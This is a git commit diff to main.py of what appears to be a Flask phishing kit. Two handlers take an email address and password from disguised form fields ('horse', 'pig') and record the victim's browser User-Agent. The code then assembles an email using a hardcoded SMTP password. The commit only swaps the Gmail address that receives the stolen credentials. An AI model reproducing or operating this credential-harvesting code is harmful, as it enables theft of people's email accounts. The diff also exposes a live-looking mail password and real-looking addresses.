7a3432ea507dd84fbd9045659b003104839b440b
fsnks <130067396+fsnks@users.noreply.github.com>
2023-09-18 06:57:07 -0700

    Update main.py

--- main.py
+++ main.py
@@ -146,7 +146,7 @@ def first():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "ghost@newupdateishere.com"
-        receiver_email = "wordbox212@gmail.com"
+        receiver_email = "theeliixirusa@gmail.com"
         password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -183,7 +183,7 @@ def second():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "ghost@newupdateishere.com"
-        receiver_email = "wordbox212@gmail.com"
+        receiver_email = "theeliixirusa@gmail.com"
         password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
